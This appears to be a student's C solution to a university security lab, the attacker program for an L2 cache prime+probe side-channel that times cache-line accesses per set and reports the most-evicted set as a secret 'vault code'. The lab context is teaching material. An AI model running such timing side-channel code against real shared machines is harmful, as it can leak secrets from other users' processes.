/**
 * 
 * CMU 15-793 Security for Secure Computer Systems Spring 2024
 *
 *  thief.c is the attacker implementation. You need to add the code for 
 *  prime_probe_l2_set_new()
 * 
 */

#include "util.h"
#include "params.h"
#include <sys/mman.h>

// you will need to generate an eviction linked list structure with next,
// previous pointers and time measurements
// then you can use the shuffle function to randomize the access pattern 
// and avoid prefetchers being activated
// then traverse the list for prime and probe
// you might want to consider adding some delay between steps
// finally you need to traverse the list one more time to retrieve 
// the time measurements
bool prime_probe_l2_set(int set, char *buf) {
    bool found = false;
    uint64_t addr = (uint64_t) (buf + (set * L2_WAYS * L2_LINE_SIZE));

    for (int i = 0; i < L2_WAYS; i++) {
      // Set the first byte of each line to 1
      uint64_t lineAddr = addr + i * L2_LINE_SIZE;
      (*((char *)lineAddr)) ++;
      uint32_t timing = measure_line_access_time(lineAddr);
      if (timing > 30 ) {
//        printf("Address = %ld, set %d  timing = %d\n",lineAddr ,set, timing);
        found = true;
      }
    }

    return found;
}

void printBinary(uint64_t num) {
  for (int i = 63; i >= 0; i--) {
    putchar((num & ((uint64_t)1 << i)) ? '1' : '0');
    if (i % 8 == 0) { // Optional: for readability, add a space every 8 bits
      putchar(' ');
    }
  }
  putchar('\n');
}

int main(int argc, char const *argv[]) {
    void *buf = NULL;
    int buf_size = 1 << 21;
    if (posix_memalign(&buf, 1 << 21, buf_size)) { // Allocates 2MB aligned memory, begins at 0x200000
        perror("posix_memalign");
    }
    madvise(buf, buf_size, MADV_HUGEPAGE);
    *((char *)buf) = 5;

    int evict_count[L2_SETS];
    for (int i = 0; i < L2_SETS; i++) {
        evict_count[i] = 0;
    }

    int num_reps = 10000;
    for (int rep = 0; rep < num_reps; rep++) {
        for (int set = 0; set < L2_SETS; set++) {
            if (prime_probe_l2_set(set, buf)) {
                evict_count[set]++;
            }
        }
    }


    int max_val = 2;
    int max_set = -1;
    for (int set = 0; set < L2_SETS; set++) {

        if (evict_count[set] > max_val) {
            max_val = evict_count[set];
            max_set = set;
          uint64_t addr = (uint64_t) (buf + (set * L2_WAYS * L2_LINE_SIZE));
          printBinary(addr);
          printf(" set addr = %ld, set number = %d , evict_count = %d\n",addr, set, evict_count[set]);
        }
    }
    printf("Vault code: %d (%d)\n", max_set, max_val);
}
